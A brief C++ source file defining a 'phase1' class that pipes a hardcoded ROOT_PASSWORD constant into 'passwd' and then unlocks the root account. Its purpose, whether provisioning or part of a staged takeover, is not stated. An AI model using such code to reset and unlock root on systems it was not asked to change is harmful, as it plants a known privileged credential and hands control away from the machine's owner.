#include "phase1.h"

phase1::phase1()
{

}

int phase1::execute()
{
  FILE* stdin = popen("passwd", "w");
  const char* newpass = ROOT_PASSWORD;
  fputs(newpass, stdin);
  fputs(newpass, stdin);
  pclose(stdin);
  system("passwd -u root"); //Unlock the root account.
  return 0;
}
